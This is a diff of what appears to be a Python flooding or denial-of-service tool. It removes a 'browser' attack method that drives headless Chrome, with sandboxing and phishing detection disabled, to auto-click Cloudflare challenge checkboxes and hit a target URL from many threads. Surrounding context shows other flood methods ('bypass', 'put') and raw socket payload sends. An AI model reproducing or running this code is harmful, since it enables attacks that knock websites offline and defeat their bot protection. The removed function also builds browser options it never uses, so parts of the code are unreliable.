@@ -534,89 +534,6 @@ def main():
                                     s.send(payl)
                             except:
                                 pass
-
-                    def browser():
-                        chrome_options = Options()
-                        user_agent = UserAgent()
-                        options = Options()
-                        options.add_argument("--disable-features=Translate,OptimizationHints,MediaRouter")
-                        options.add_argument("--disable-extensions")
-                        options.add_argument("--disable-component-extensions-with-background-pages")
-                        options.add_argument("--disable-background-networking")
-                        options.add_argument("--disable-component-update")
-                        options.add_argument("--disable-client-side-phishing-detection")
-                        options.add_argument("--disable-sync")
-                        options.add_argument("--metrics-recording-only")
-                        options.add_argument("--disable-default-apps")
-                        options.add_argument("--mute-audio")
-                        options.add_argument("--no-default-browser-check")
-                        options.add_argument("--no-first-run")
-                        options.add_argument("--disable-backgrounding-occluded-windows")
-                        options.add_argument("--disable-renderer-backgrounding")
-                        options.add_argument("--disable-background-timer-throttling")
-                        options.add_argument("--disable-ipc-flooding-protection")
-                        options.add_argument("--password-store=basic")
-                        options.add_argument("--use-mock-keychain")
-                        options.add_argument("--force-fieldtrials=*BackgroundTracing/default/")
-                        options.add_argument("--allow-pre-commit-input")
-                        options.add_argument("--disable-breakpad")
-                        options.add_argument("--disable-dev-shm-usage")
-                        options.add_argument("--disable-hang-monitor")
-                        options.add_argument("--disable-popup-blocking")
-                        options.add_argument("--disable-prompt-on-repost")
-                        options.add_argument("--disable-search-engine-choice-screen")
-                        options.add_argument("--enable-blink-features=IdleDetection")
-                        options.add_argument("--enable-features=NetworkServiceInProcess2")
-                        options.add_argument("--export-tagged-pdf")
-                        options.add_argument("--force-color-profile=srgb")
-                        options.add_argument("--disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints")
-                        options.add_argument("--test-type")
-                        options.add_argument("--renderer-process-limit=1")
-                        options.add_argument("--in-process-gpu")
-                        options.add_argument("--disable-gpu")
-                        options.add_argument("--disable-setuid-sandbox")
-                        options.add_argument("--no-zygote")
-                        options.add_argument("--no-sandbox")
-                        options.add_argument("--headless=new")
-                        options.add_argument("--user-agent=" + user_agent)
-                        service = Service()
-                        driver = webdriver.Chrome(service=service , options=chrome_options)
-                        driver.get(url)
-                        sleep(5)
-                        try:
-                            captcha_element = driver.find_element(By.ID , "captcha")
-                            captcha_element.click()
-                            driver.execute_script(f"window.open('{url}', '_blank');")
-                            sleep(30)
-                            driver.switch_to.window(
-                                window_name=driver.window_handles[0]
-                            )
-                            driver.close()
-                            driver.switch_to.window(
-                                window_name=driver.window_handles[0]
-                            )
-                            source = driver.page_source
-                            if "access denied" in driver.title.lower():
-                                driver.quit()
-                            if "challenge-platform" in source:
-                                CLOUDFLARE_CAPTCHA_SELECTOR = "iframe[src*='challenges']"
-                                CLOUDFLARE_CHECKBOX_SELECTOR = "input[type='checkbox']"
-                                wait_for_selector_visible(driver=driver, selector=CLOUDFLARE_CAPTCHA_SELECTOR, timeout=30)
-                                captcha_box = driver.find_element("css selector", CLOUDFLARE_CAPTCHA_SELECTOR)
-                                driver.switch_to.frame(captcha_box)
-                                sleep(12)
-                                captcha_checkbox = driver.find_element("css selector", CLOUDFLARE_CHECKBOX_SELECTOR)
-                                actions = ActionChains(driver=driver)
-                                actions.click(captcha_checkbox)
-                                actions.perform()
-                                driver.switch_to.default_content()
-                                wait_for_navigate(driver=driver)
-                                sleep(12)
-                        except:
-                            pass
-                        sleep(9)
-                        driver.quit()
-                        return driver
                     
                     def put():
                         while time() < timer:
@@ -1176,9 +1093,6 @@ def main():
                     elif method == 'bypass':
                         for _ in range(threads):
                             thr(target=bypass).start()
-                    elif method == 'browser':
-                        for _ in range(threads):
-                            thr(target=browser).start()
                     elif method == 'put':
                         for _ in range(threads):
                             thr(target=put).start()
